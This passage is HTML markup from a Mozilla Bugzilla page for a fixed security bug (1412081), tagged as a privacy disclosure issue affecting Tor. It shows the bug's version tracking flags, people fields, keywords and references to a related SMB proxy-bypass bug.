uot;---&quot;,&quot;cf_status_thunderbird_esr78&quot;:&quot;---&quot;,&quot;flags&quot;:[{&quot;status&quot;:&quot;?&quot;,&quot;name&quot;:&quot;needinfo&quot;}],&quot;id&quot;:1412081,&quot;cf_status_thunderbird_esr91&quot;:&quot;---&quot;,&quot;cf_tracking_firefox60&quot;:&quot;-&quot;,&quot;cf_status_firefox56&quot;:&quot;wontfix&quot;,&quot;priority&quot;:&quot;P2&quot;,&quot;cf_tracking_firefox95&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_esr91&quot;:&quot;---&quot;,&quot;cf_fission_milestone&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_esr52&quot;:&quot;-&quot;,&quot;cf_status_firefox58&quot;:&quot;wontfix&quot;,&quot;cf_status_firefox95&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_esr78&quot;:&quot;---&quot;,&quot;cf_status_firefox63&quot;:&quot;fixed&quot;,&quot;cf_status_firefox57&quot;:&quot;wontfix&quot;}"></span>)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-tracking-content"
  ><div class="fields-lhs">

    <div class="field edit-hide" id="field-status-view"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugStatuses" id="status-view-help-link" class="help">Status:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-status-view">RESOLVED
        FIXED
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-status-edit" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugStatuses" id="status-edit-help-link" class="help">Status:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-status-edit"><div class="field inline" id="field-bug_status"
>


  
    <div class="value">
        <span id="field-value-bug_status">
            RESOLVED

        </span>
    </div>

  
</div><div class="field indent inline" id="field-resolution"
>


  
    <div class="value">
        <span id="field-value-resolution">
            FIXED

        </span>
    </div>

  
</div>
  <div id="status-action-buttons">
      <div id="assigned-container" style="display:none">
        <button type="button" class="secondary" id="mark-as-assigned-btn">
          Mark as Assigned
        </button>
      </div>
  </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-target_milestone"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone" id="target_milestone-help-link" class="help">Milestone:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-target_milestone">
            mozilla63

        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-cf_fx_iteration" style="display:none"
>
    <div class="name">Iteration:
    </div>


  
    <div class="value">
        <span id="field-value-cf_fx_iteration">
            ---

        </span>
    </div>

  
</div>


      <div class="field edit-show" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags" id="-help-link" class="help">Project Flags:
        </a>
    </div>


  
    <div class=" container"><div class="flags edit-show" style="display:none">
  <table class="layout-table tracking-flags">
      <tr>
        <td class="tracking-flag-name">Root Cause</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_root_cause-dirty">
  <select id="cf_root_cause" name="cf_root_cause">
        <option value="---"
          id="v4701_cf_root_cause" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">a11y-review</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_a11y_review_project_flag-dirty">
  <select id="cf_a11y_review_project_flag" name="cf_a11y_review_project_flag">
        <option value="---"
          id="v4876_cf_a11y_review_project_flag" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">Webcompat Priority</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_webcompat_priority-dirty">
  <select id="cf_webcompat_priority" name="cf_webcompat_priority">
        <option value="---"
          id="v4274_cf_webcompat_priority" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">user-doc-firefox</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_tracking_firefox_sumo-dirty">
  <select id="cf_tracking_firefox_sumo" name="cf_tracking_firefox_sumo">
        <option value="---"
          id="v4660_cf_tracking_firefox_sumo" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">Fission Milestone</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_fission_milestone-dirty">
  <select id="cf_fission_milestone" name="cf_fission_milestone">
        <option value="---"
          id="v4222_cf_fission_milestone" selected
        >---
        </option>
  </select></td>
      </tr>
  </table>
</div>
    </div>

  
</div>
</div><div class="fields-rhs">

      <div class="field"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags" id="-help-link" class="help">Tracking Flags:
        </a>
    </div>


  
    <div class=" container"><div class="flags edit-hide">
    <table class="layout-table tracking-flags">
        <tr>
          <th></th>
          <th>Tracking</th>
          <th>Status</th>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox-esr52</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox_esr52&amp;o1=equals&amp;v1=-">-</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox_esr52&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox-esr60</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox_esr60&amp;o1=equals&amp;v1=62%2B">62+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox56</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox56&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox57</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox57&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox57&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox58</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox58&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox58&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox59</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox59&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox59&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox60</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox60&amp;o1=equals&amp;v1=-">-</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox60&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox61</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox61&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox62</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox62&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox63</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox63&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
    </table>
  </div>


<div class="flags edit-show" style="display:none">
  <table class="layout-table tracking-flags">
      <tr>
        <th></th>
        <th>Tracking</th>
        <th>Status</th>
      </tr>
      <tr>
        <td class="tracking-flag-name">relnote-firefox</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_tracking_firefox_relnote-dirty">
  <select id="cf_tracking_firefox_relnote" name="cf_tracking_firefox_relnote">
        <option value="---"
          id="v539_cf_tracking_firefox_relnote" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird_esr78</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_thunderbird_esr78-dirty">
  <select id="cf_tracking_thunderbird_esr78" name="cf_tracking_thunderbird_esr78">
        <option value="---"
          id="v4823_cf_tracking_thunderbird_esr78" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_esr78-dirty">
  <select id="cf_status_thunderbird_esr78" name="cf_status_thunderbird_esr78">
        <option value="---"
          id="v4829_cf_status_thunderbird_esr78" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird_esr91</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_thunderbird_esr91-dirty">
  <select id="cf_tracking_thunderbird_esr91" name="cf_tracking_thunderbird_esr91">
        <option value="---"
          id="v5236_cf_tracking_thunderbird_esr91" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_esr91-dirty">
  <select id="cf_status_thunderbird_esr91" name="cf_status_thunderbird_esr91">
        <option value="---"
          id="v5242_cf_status_thunderbird_esr91" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr52</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr52-dirty">
  <select id="cf_tracking_firefox_esr52" name="cf_tracking_firefox_esr52">
        <option value="-"
          id="v3106_cf_tracking_firefox_esr52" selected
        >-
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr52-dirty">
  <select id="cf_status_firefox_esr52" name="cf_status_firefox_esr52">
        <option value="wontfix"
          id="v3142_cf_status_firefox_esr52" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr60</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr60-dirty">
  <select id="cf_tracking_firefox_esr60" name="cf_tracking_firefox_esr60">
        <option value="62+"
          id="v3730_cf_tracking_firefox_esr60" selected
        >62+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr60-dirty">
  <select id="cf_status_firefox_esr60" name="cf_status_firefox_esr60">
        <option value="fixed"
          id="v3636_cf_status_firefox_esr60" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr78</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr78-dirty">
  <select id="cf_tracking_firefox_esr78" name="cf_tracking_firefox_esr78">
        <option value="---"
          id="v4808_cf_tracking_firefox_esr78" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr78-dirty">
  <select id="cf_status_firefox_esr78" name="cf_status_firefox_esr78">
        <option value="---"
          id="v4813_cf_status_firefox_esr78" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr91</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr91-dirty">
  <select id="cf_tracking_firefox_esr91" name="cf_tracking_firefox_esr91">
        <option value="---"
          id="v5194_cf_tracking_firefox_esr91" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr91-dirty">
  <select id="cf_status_firefox_esr91" name="cf_status_firefox_esr91">
        <option value="---"
          id="v5199_cf_status_firefox_esr91" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox56</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox56-dirty">
  <select id="cf_status_firefox56" name="cf_status_firefox56">
        <option value="wontfix"
          id="v3282_cf_status_firefox56" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox57</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox57-dirty">
  <select id="cf_tracking_firefox57" name="cf_tracking_firefox57">
        <option value="+"
          id="v3288_cf_tracking_firefox57" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox57-dirty">
  <select id="cf_status_firefox57" name="cf_status_firefox57">
        <option value="wontfix"
          id="v3297_cf_status_firefox57" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox58</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox58-dirty">
  <select id="cf_tracking_firefox58" name="cf_tracking_firefox58">
        <option value="+"
          id="v3453_cf_tracking_firefox58" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox58-dirty">
  <select id="cf_status_firefox58" name="cf_status_firefox58">
        <option value="wontfix"
          id="v3447_cf_status_firefox58" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox59</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox59-dirty">
  <select id="cf_tracking_firefox59" name="cf_tracking_firefox59">
        <option value="+"
          id="v3502_cf_tracking_firefox59" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox59-dirty">
  <select id="cf_status_firefox59" name="cf_status_firefox59">
        <option value="wontfix"
          id="v3511_cf_status_firefox59" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox60</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox60-dirty">
  <select id="cf_tracking_firefox60" name="cf_tracking_firefox60">
        <option value="-"
          id="v3559_cf_tracking_firefox60" selected
        >-
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox60-dirty">
  <select id="cf_status_firefox60" name="cf_status_firefox60">
        <option value="wontfix"
          id="v3567_cf_status_firefox60" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox61</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox61-dirty">
  <select id="cf_status_firefox61" name="cf_status_firefox61">
        <option value="wontfix"
          id="v3654_cf_status_firefox61" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox62</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox62-dirty">
  <select id="cf_status_firefox62" name="cf_status_firefox62">
        <option value="fixed"
          id="v3742_cf_status_firefox62" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox63</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox63-dirty">
  <select id="cf_status_firefox63" name="cf_status_firefox63">
        <option value="fixed"
          id="v3804_cf_status_firefox63" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox93</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox93-dirty">
  <select id="cf_tracking_firefox93" name="cf_tracking_firefox93">
        <option value="---"
          id="v5266_cf_tracking_firefox93" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox93-dirty">
  <select id="cf_status_firefox93" name="cf_status_firefox93">
        <option value="---"
          id="v5271_cf_status_firefox93" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox94</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox94-dirty">
  <select id="cf_tracking_firefox94" name="cf_tracking_firefox94">
        <option value="---"
          id="v5284_cf_tracking_firefox94" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox94-dirty">
  <select id="cf_status_firefox94" name="cf_status_firefox94">
        <option value="---"
          id="v5289_cf_status_firefox94" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox95</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox95-dirty">
  <select id="cf_tracking_firefox95" name="cf_tracking_firefox95">
        <option value="---"
          id="v5311_cf_tracking_firefox95" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox95-dirty">
  <select id="cf_status_firefox95" name="cf_status_firefox95">
        <option value="---"
          id="v5316_cf_status_firefox95" selected
        >---
        </option>
  </select></td>
      </tr>
  </table>
</div>
    </div>

  
</div>

</div>
  </div>
</section>



<section class="module" id="module-people"
>
    <header id="module-people-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse People section"
           data-label-collapsed="Expand People section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-people-content"
             aria-expanded="false"
             aria-labeledby="module-people-title"
             aria-describedby="module-people-subtitle"></div>
        <h2 class="module-title" id="module-people-title">People</h2>
          <h3 class="module-subtitle" id="module-people-subtitle">
            (Reporter: arthur, Assigned: valentin, NeedInfo)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-people-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field edit-hide" id="field-assigned_to"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to" id="assigned_to-help-link" class="help">Assignee:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-assigned_to"><div class="vcard vcard_415378" ><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=415378" > <span class="fna">valentin</span></a>
</div>
        </span>
    </div>

  
</div><div class="field edit-show" id="field-assigned_to" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to" id="assigned_to-help-link" class="help">Assignee:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-assigned_to">
      <div class="set-default-container" style="display:none">
        <input type="checkbox" id="set-default-assignee" name="set_default_assignee" class="set-default"
          value="1" data-for="assigned_to">
        <label for="set-default-assignee">Reset Assignee to default</label>
      </div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-bug_mentors" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor" id="bug_mentors-help-link" class="help">Mentors:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_mentors">---
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-qa_contact" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact" id="qa_contact-help-link" class="help">QA Contact:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-qa_contact">
      <div class="set-default-container" style="display:none">
        <input type="checkbox" id="set-default-qa-contact" name="set_default_qa_contact" class="set-default"
          value="1" data-for="qa_contact">
        <label for="set-default-qa-contact">Reset QA Contact to default</label>
      </div>
        </span>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field" id="field-reporter"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter" id="reporter-help-link" class="help">Reporter:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-reporter">
            <div class="vcard vcard_474980" ><img src="https://secure.gravatar.com/avatar/dfcd4ae2df9a810044e19c011304881e?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=474980" > <span class="fna">arthur</span></a>
</div>

        </span>
    </div>

  
</div>

    <div class="field" id="field-triage_owner"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner" id="triage_owner-help-link" class="help">Triage Owner:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-triage_owner">
            <div class="vcard vcard_646284" ><img src="https://secure.gravatar.com/avatar/9dcff4a8838b41f34d204c2f4cadbcc4?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=646284" > <span class="fna">jstutte</span></a>
</div>

        </span>
    </div>

  
</div>

    <div class="field edit-hide"
>
    <div class="name">NeedInfo From:
    </div>


  
    <div class=" container"><div class="flags edit-hide">
        <div class="flag"><div class="vcard vcard_474980" ><a class="email " href="/user_profile?user_id=474980" > <span class="fna">arthur</span></a>
</div>
            <a href="#c114"
            class=" activity-ref"
          ><span class="rel-time" title="2018-07-24 08:13 PDT" data-time="1532445203">3 years ago</span></a>
        </div>
  </div>
    </div>

  
</div><div class="field edit-show" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#needinfo" id="-help-link" class="help">NeedInfo:
        </a>
    </div>


  
    <div class=" container">
        <button type="button" id="needinfo-scroll" class="secondary">Update</button>
    </div>

  
</div>

    <div class="field"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc" id="-help-link" class="help">CC:
        </a>
    </div>


  
    <div class=" container">


        <span aria-owns="cc-summary cc-latch">
          <span role="button" tabindex="0" id="cc-summary" data-count="38">38 people
          </span>
        </span>


        <div id="cc-list" style="display:none"></div>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-references"
>
    <header id="module-references-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse References section"
           data-label-collapsed="Expand References section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-references-content"
             aria-expanded="false"
             aria-labeledby="module-references-title"
             aria-describedby="module-references-subtitle"></div>
        <h2 class="module-title" id="module-references-title">References</h2>
          <h3 class="module-subtitle" id="module-references-subtitle">
            (<div class="link">
    <a href="https://pearlcrescent.com/tor/am.html" target="_blank"
      rel="noreferrer" title="https://pearlcrescent.com/tor/am.html"
      class="bug-url" data-safe="1">URL</a>
  </div>)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-references-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field bug-list" id="field-dependson"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson" id="dependson-help-link" class="help">Depends on:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-dependson">
            <div class="bug-list">
        <span class="bug-type-label iconic" title="defect"
              aria-label="defect" data-type="defect">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - proxy bypass on windows via smb"
   href="/show_bug.cgi?id=1413868">1413868</a>, <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Use static array for sWhitelist instead of StaticAutoPtr"
   href="/show_bug.cgi?id=1483377">1483377</a>
      </div>

        </span>
    </div>

  
</div><div class="field bug-list edit-show" id="field-blocked" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks" id="blocked-help-link" class="help">Blocks:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-blocked">
        ---
        </span>
    </div>

  
</div><div class="field" id="field-dependencytree"
>
    <div class="name">
    </div>


  
    <div class=" container">
        <span id="field-value-dependencytree">
        Dependency <a href="/showdependencytree.cgi?id=1412081&amp;hide_resolved=1">tree</a>
        / <a href="/showdependencygraph.cgi?id=1412081">graph</a>
        </span>
    </div>

  
</div>

    <div class="field bug-list edit-show" id="field-regresses" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses" id="regresses-help-link" class="help">Regressions:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-regresses">
        ---
        </span>
    </div>

  
</div><div class="field bug-list edit-show" id="field-regressed_by" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by" id="regressed_by-help-link" class="help">Regressed by:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-regressed_by">
        ---
        </span>
    </div>

  
</div>

    
</div><div class="fields-rhs">

    <div class="field" id="field-bug_file_loc"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc" id="bug_file_loc-help-link" class="help">URL:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_file_loc"><div class="link">
    <a href="https://pearlcrescent.com/tor/am.html" target="_blank"
      rel="noreferrer" title="https://pearlcrescent.com/tor/am.html"
      class="bug-url" data-safe="1">pearlcrescent.com/tor/am.html</a>
  </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-see_also"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also" id="see_also-help-link" class="help">See Also:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-see_also">
            <div class="bug-list">
        <span class="bug-type-label iconic" title="defect"
              aria-label="defect" data-type="defect">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - proxy bypass on windows via smb"
   href="/show_bug.cgi?id=1413868">1413868</a>
      </div>

        </span>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-details"
>
    <header id="module-details-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Details section"
           data-label-collapsed="Expand Details section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-details-content"
             aria-expanded="false"
             aria-labeledby="module-details-title"
             aria-describedby="module-details-subtitle"></div>
        <h2 class="module-title" id="module-details-title">Details</h2>
          <h3 class="module-subtitle" id="module-details-subtitle">
            (Keywords: csectype-disclosure, privacy, sec-moderate, Whiteboard: [tor 24052][sec-critical for Tor][necko-triaged][post-critsmash-triage][adv-main62+][adv-esr60.2+])
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-details-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field edit-show" id="field-alias" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias" id="alias-help-link" class="help">Alias:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-alias">
        ---
        </span>
    </div>

  
</div>

    <div class="field" id="field-keywords"
>
    <div class="name">
        <a href="/describekeywords.cgi" id="keywords-help-link" class="help">Keywords:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-keywords">
          <a href="/buglist.cgi?keywords=csectype-disclosure&amp;resolution=---">csectype-disclosure</a>, 
          <a href="/buglist.cgi?keywords=privacy&amp;resolution=---">privacy</a>, 
          <a href="/buglist.cgi?keywords=sec-moderate&amp;resolution=---">sec-moderate</a>
        </span>
    </div>

  
</div>

    <div class="field" id="field-status_whiteboard"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/Whiteboard" id="status_whiteboard-help-link" class="help">Whiteboard:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-status_whiteboard">[tor 24052][sec-critical for Tor][necko-triaged][post-critsmash-triage][adv-main62+][adv-esr60.2+]
        </span>
    </div>

  
</div><div class="field edit-show" id="field-cf_qa_whiteboard" style="display:none"
>
    <div class="name">QA Whiteboard:
    </div>


  
    <div class="value">
        <span id="field-value-cf_qa_whiteboard">
        ---
        </span>
    </div>

  
</div>

    

    <div class="field edit-show" id="field-cf_has_regression_range" style="display:none"
>
    <div class="name">Has Regression Range:
    </div>


  
    <div class="value">
        <span id="field-value-cf_has_regression_range">
            ---

        </span>
    </div>

  
</div><div class="field" id="field-cf_has_str"
>
    <div class="name">Has STR:
    </div>


  
    <div class="value">
        <span id="field-value-cf_has_str">
            yes

        </span>
    </div>

  
</div>

    <div class="field" id="field-votes"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes" id="votes-help-link" class="help">Votes:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-votes">0
        </span>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field edit-show" id="field-bug_flags" style="display:none"
>
    <div class="name">Bug Flags:
    </div>


  
    <div class=" container">
        <span id="field-value-bug_flags"><div id="bug-flags" class="flags">
  <table class="layout-table">
    <tbody class="edit-show" style="display:none"><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Is this bug/feature enabled in a release by a pref flag (see https://github.com/mozilla/bug-handling/blob/master/policy/feature-flags.md)?" for="flag_type-930">behind-pref</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-930-dirty">
      <select id="flag_type-930" name="flag_type-930"
        title="Is this bug/feature enabled in a release by a pref flag (see https://github.com/mozilla/bug-handling/blob/master/policy/feature-flags.md)?"
        class="bug-flag">
          <option value="X"></option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag tracking inclusion in the desktop Firefox product backlog." for="flag_type-846">firefox-backlog</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-846-dirty">
      <select id="flag_type-846" name="flag_type-846"
        title="Flag tracking inclusion in the desktop Firefox product backlog."
